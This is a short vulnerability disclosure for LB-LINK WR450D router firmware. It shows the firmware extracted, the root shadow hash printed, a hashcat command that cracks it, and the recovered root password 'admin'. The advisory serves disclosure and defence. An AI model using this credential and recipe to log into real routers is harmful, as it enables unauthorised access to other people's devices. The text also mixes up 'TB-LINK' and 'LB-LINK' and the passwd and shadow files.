# Summary



There is a credential hard-coding vulnerability in the TB-LINK WR450D_28AE5_D-Open(V1.01)_TFTP device. An attacker can obtain the password by combining the md5 hash stored in the etc/passwd file in the firmware with hashcat brute force.

Manufacturer's official website: https://www.lb-link.com/

Firmware download address: https://www.lb-link.com/Upgrade-Software-dc212882.html

# Details



Download the firmware, unzip the uImage with `binwalk -Me`, and view the etc/shadow file: 

![image-20241225122422750](./LB-LINK WR450D_28AE5_D-Open(V1.01)_TFTP Hardcoded Credential and Weak Password/images/image-20241225122422750.png)

```
iot@iot-virtual-machine:~/Desktop/IoT/_uImage.extracted/squashfs-root$ cat etc/shadow root:$1$SJ5LSTDn$xtmlqmpxDeKFfyugLM6.E.:18380:0:99999:7::: CMCCAdmin:$1$SJ5LSTDn$xtmlqmpxDeKFfyugLM6.E.:18380:0:99999:7::: user:$1$SJ5LSTDn$xtmlqmpxDeKFfyugLM6.E.:18380:0: 99999:7:::
daemon:*:0:0:99999:7:::
ftp:*:0:0:99999:7:::
network:*:0:0:99999:7:::
nobody:*:0:0:99999:7:::
```



Use hashcat to blast `$1$SJ5LSTDn$xtmlqmpxDeKFfyugLM6.E.`:

```
hashcat -m 500 -a 0 hash.txt ~/Desktop/rockyou.txt
```

![image-20241225122437402](./LB-LINK WR450D_28AE5_D-Open(V1.01)_TFTP Hardcoded Credential and Weak Password/images/image-20241225122437402.png)



The password is: admin

# Discoverer



https://github.com/N0zoM1z0/